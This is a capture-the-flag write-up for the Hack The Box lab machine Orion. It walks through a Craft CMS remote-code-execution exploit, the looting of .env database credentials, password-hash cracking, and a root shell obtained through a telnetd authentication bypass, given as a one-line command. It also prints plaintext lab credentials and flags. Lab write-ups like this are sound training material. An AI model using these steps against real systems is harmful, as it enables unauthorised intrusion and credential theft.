# 🔱 TRIDENT KNOWLEDGE BASE
# MACHINE-002
# Orion (Hack The Box)

Difficulty: Easy
Platform: Hack The Box
Completion Date: July 17, 2026

Status:
🟢 ROOTED

---

# Objective

Obtain initial access to Orion and escalate privileges to root.

---

# Attack Chain

Internet
│
▼
Craft CMS (CVE-2025-32432)
│
▼
www-data Shell
│
▼
Read Craft .env
│
▼
MariaDB Root Credentials
│
▼
Extract Craft Admin Hash
│
▼
Crack Password
│
▼
SSH as adam
│
▼
Local Enumeration
│
▼
GNU inetutils telnetd 2.7
│
▼
USER="-f root" Authentication Bypass
│
▼
ROOT

---

# Initial Enumeration

Target exposed:

- HTTP (Craft CMS)

Craft CMS version vulnerable to:

CVE-2025-32432

Exploit used:

Metasploit

exploit/linux/http/craftcms_preauth_rce_cve_2025_32432

Result:

www-data shell

---

# Looting the Web Server

Located:

/var/www/html/craft/.env

Recovered:

Database:

MariaDB

Root Password:

SuperSecureCraft123Pass!

Important lesson:

Always inspect:

- .env
- config files
- backup files
- docker-compose.yml
- .git
- secrets

These frequently contain reusable credentials.

---

# Database Enumeration

Connected as MariaDB root.

Extracted Craft CMS users.

Recovered administrator account:

Username:

admin

Password Hash:

$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS

Hash cracked to:

darkangel

---

# SSH Access

SSH:

adam

Password:

darkangel

Obtained:

User Flag

41d45cfcd4740c8c7653d488b4ba3e44

---

# Privilege Escalation Enumeration

The following were investigated and ruled out.

## sudo

No sudo permissions.

---

## SUID

Only default Ubuntu binaries.

Nothing custom.

---

## Linux Capabilities

Nothing useful.

---

## Docker

No docker socket.

---

## LXD

Socket existed.

No permissions.

User not in lxd group.

---

## Laurel

Initially looked suspicious.

Reason:

Custom installation.

Interesting config:

label-script."^/root/maint-.*[.]sh$"

After investigation:

Completely stock configuration.

False lead.

Lesson:

Don't confuse logging software with execution.

---

## Kernel

Ubuntu

5.15.0-177-generic

No practical local exploits.

---

# The Turning Point

After several hours of enumeration, everything looked normal.

We had begun forcing enumeration instead of following evidence.

One observation remained strange:

A localhost-only telnet service.

---

# inetd

Configuration:

127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd

Initial assumption:

Custom telnet daemon.

Investigation revealed:

/usr/local/sbin/telnetd

↓

symlink

↓

/usr/libexec/telnetd

GNU inetutils telnetd

Version:

2.7

This shifted the investigation from:

"What is this binary?"

to

"Is this version vulnerable?"

---

# Root Exploit

Affected Software

GNU inetutils

telnetd

Version:

2.7

Vulnerability:

Authentication bypass using USER environment variable.

Exploit:

USER="-f root" telnet -a 127.0.0.1

Result:

Immediate root shell.

Verification:

whoami

↓

root

Captured:

Root Flag

2184f7a56354f11ad314200127dff36a

---

# Biggest Lessons Learned

## 1

Always investigate localhost services.

A service listening only on:

127.0.0.1

is still exposed once a foothold exists.

Local services are part of the attack surface.

---

## 2

When every standard privilege escalation fails...

Stop.

Do not blindly enumerate more.

Ask:

"What looked unusual earlier?"

In Orion:

It was telnet.

---

## 3

New software can still be vulnerable.

The exploit wasn't against:

An ancient version.

It was against:

GNU inetutils 2.7

Recent software.

Never assume:

Newest == Secure.

---

## 4

Configuration matters.

The interesting part wasn't telnet itself.

It was:

inetd

↓

running as root

↓

bound locally

↓

vulnerable version

Understanding architecture is often more valuable than running another enumeration tool.

---

## 5

Don't chase every rabbit forever.

We investigated:

- Laurel
- sudo
- capabilities
- SUID
- Docker
- LXD
- cron
- systemd

Every one was valid.

But eventually...

Evidence stopped increasing.

That is the signal to pivot.

---

# Enumeration Philosophy

A penetration test should resemble a detective investigation.

Observe

↓

Form hypotheses

↓

Test

↓

Eliminate

↓

Return to anomalies

↓

Repeat

The goal is not to run every tool.

The goal is to reduce uncertainty.

---

# Trident Methodology Update

If privilege escalation stalls:

1.

List everything unusual.

2.

Ignore everything normal.

3.

Rank by:

- uniqueness
- privilege
- accessibility

4.

Investigate highest anomaly first.

This machine perfectly demonstrated why.

---

# Commands Worth Remembering

Craft CMS

Read .env

cat /var/www/html/craft/.env

SSH

ssh adam@host

Telnet version

/usr/libexec/telnetd --version

Root exploit

USER="-f root" telnet -a 127.0.0.1

---

# Final Thoughts

The hardest part of Orion was not exploiting it.

The hardest part was trusting the evidence.

Once every common Linux privilege escalation path had been ruled out, the answer was waiting where the investigation began:

The strange localhost telnet service.

The lesson is timeless:

When the investigation feels like you're forcing it...

Return to the anomaly.

The anomaly is usually the answer.

---

{{ PREVAIL | Trident }}

Machine 002 Complete